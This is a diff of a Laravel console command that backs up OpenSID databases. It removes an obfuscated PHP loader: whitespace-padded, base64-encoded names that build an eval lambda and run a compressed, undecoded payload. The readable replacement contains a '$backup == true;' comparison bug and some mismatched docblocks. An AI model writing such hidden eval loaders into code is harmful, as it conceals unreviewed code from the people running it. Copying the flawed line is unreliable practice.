@@ -1,521 +1,108 @@
-<?php 
-        $__='printf';$_='Loading app/Console/Commands/BackupDatabase.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Console\Commands;
+
+use Exception;
+use App\Services\AplikasiService;
+use App\Services\DatabaseBackupService;
+use Illuminate\Console\Command;
+use Illuminate\Support\Facades\Log;
+
+class BackupDatabase extends Command
+{
+    /**
+     * Nama dan tanda tangan dari perintah konsol.
+     *
+     * @var string
+     */
+    protected $signature = 'siappakai:backup-database';
+
+    /**
+     * Deskripsi perintah konsol.
+     *
+     * @var string
+     */
+    protected $description = 'Melakukan backup database OpenSID (dapat dilakukan melalui cronjob jika ada rilis terbaru)';
+
+    private $aplikasiService;
+    private $backupDatabaseService;
+
+    /**
+     * Membuat instance perintah baru.
+     *
+     * @param BackupFolderService $backupFolderService
+     * @param DatabaseBackupService $backupDatabaseService
+     * @param TarGzService $tarGzService
+     * @return void
+     */
+    public function __construct(AplikasiService $aplikasiService,
+        DatabaseBackupService $backupDatabaseService
+    ) {
+        parent::__construct();
+        $this->backupDatabaseService = $backupDatabaseService;
+        $this->aplikasiService = $aplikasiService;
+    }
+
+    /**
+     * Menjalankan perintah konsol untuk melakukan backup database.
+     *
+     * @return int Status kode eksekusi, 0 jika sukses, 1 jika gagal.
+     */
+    public function handle()
+    {
+        // Menentukan direktori untuk menyimpan backup
+        $folder_backup = siappakai_storage() . DIRECTORY_SEPARATOR . 'backup';
+        $folder_backup_database = $folder_backup . DIRECTORY_SEPARATOR . 'database';
+        $backup = false;
+
+        try {
+            // Membuat backup untuk database Siappakai
+            echo "Memulai backup database Siappakai\n";
+            $this->backupDatabaseService->backupDatabaseSiappakai($folder_backup_database);
+            echo "Backup database Siappakai selesai\n";
+
+            if ($this->aplikasiService->cekPengaturanOpensid('umum')) {
+                // Membuat file backup database umum
+                // dengan nama file berupa db_gabungan_umum.sql
+                // dan menyimpannya di folder $folder_backup_database
+                echo "Memulai backup database Umum\n";
+                $this->backupDatabaseService->backupDatabaseOpensid('db_gabungan_umum', $folder_backup_database);
+                echo "Backup database umum selesai\n";
+
+                // Setelah backup selesai, maka variabel $backup di setelai menjadi true
+                $backup == true;
+            }
+
+            if ($this->aplikasiService->cekPengaturanOpensid('premium')) {
+                // Membuat file backup database premium
+                // dengan nama file berupa db_gabungan_premium.sql
+                // dan menyimpannya di folder $folder_backup_database
+                echo "Memulai backup database premium\n";
+                $this->backupDatabaseService->backupDatabaseOpensid('db_gabungan_premium', $folder_backup_database);
+                echo "Backup database premium selesai\n";
+
+                // Membuat backup untuk database PBB
+                echo "Memulai backup database Pbb\n";
+                $this->backupDatabaseService->backupDatabasePBB($folder_backup_database);
+                echo "Backup database Pbb selesai\n";
+
+                // Setelah backup selesai, maka variabel $backup di setelai menjadi true
+                $backup = true;
+            }
+
+            // Jika backup berhasil, maka update tanggal akhir backup
+            if ($backup) {
+                // Mengupdate tanggal akhir backup
+                $this->backupDatabaseService->updateTerakhirBackup();
+            }
+
+        } catch (Exception $ex) {
+            // Mencatat error ke log dan menampilkan pesan error
+            Log::error($ex->getMessage());
+            echo "Terjadi error saat backup database: " . $ex->getMessage();
+            return 1;
+        }
+
+        return 0;
+    }
+}
